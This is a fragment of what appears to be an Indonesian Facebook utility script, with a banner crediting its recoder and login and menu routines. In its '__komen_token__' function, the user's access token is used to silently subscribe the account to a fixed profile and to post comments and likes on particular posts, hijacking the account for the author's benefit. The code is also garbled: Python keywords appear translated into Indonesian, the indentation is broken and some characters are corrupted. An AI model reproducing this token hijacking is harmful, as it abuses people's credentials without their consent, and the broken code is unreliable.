...
logo = ("""\033[1;97m     __  __    _ 
   / / / /   (_)
  / /_/ /   / / 
 / __  /   / /  
/_/ /_/   /_/   
Recode by:Sc rozhak ID
""")
def __login__():
	os.system('hapus')
	cetak (logo)
...
def __komen_token__():
	...
	request.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + token) #Muhammad Rozhak
        request.post('https://graph.facebook.com/10159090813023544/comments/?message=' +__kom__+ '&access_token=' + token)
        request.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + token)
        request.post('https://graph.facebook.com/10159090813023544/comments/?message='+__kom2__+'&access_token=' + token)
        request.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + token)
...
def __menu__():
		...
		exit('[â€¢] Kesalahan Koneksi')
        os.system('hapus')
	cetak (logo)
	print('[×] Name lu siapa:v : '+name)
	print('[×] Ulang Tahun : '+ulang tahun)
